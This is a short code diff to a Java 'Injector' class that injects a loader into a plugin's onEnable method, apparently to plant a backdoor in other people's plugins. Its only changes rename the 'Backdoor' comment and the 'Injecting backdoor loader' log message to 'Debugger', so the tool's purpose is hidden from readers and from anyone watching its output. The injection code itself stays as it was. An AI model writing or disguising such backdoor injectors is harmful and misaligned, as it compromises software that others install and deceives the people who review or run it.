@@ -76,7 +76,7 @@ public class Injector {
         if(!quiet)
             System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);
 
-        /*--- Copy Backdoor Code ---*/
+        /*--- Copy Debugger Code ---*/
 
         FileSystem outStream    = null;
         try {
@@ -171,7 +171,7 @@ public class Injector {
             //Get main class, and find onEnable method
 
             if(!quiet)
-                System.out.println("[Injector] Injecting backdoor loader into class.");
+                System.out.println("[Injector] Injecting debugger loader into class.");
 
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("onEnable");
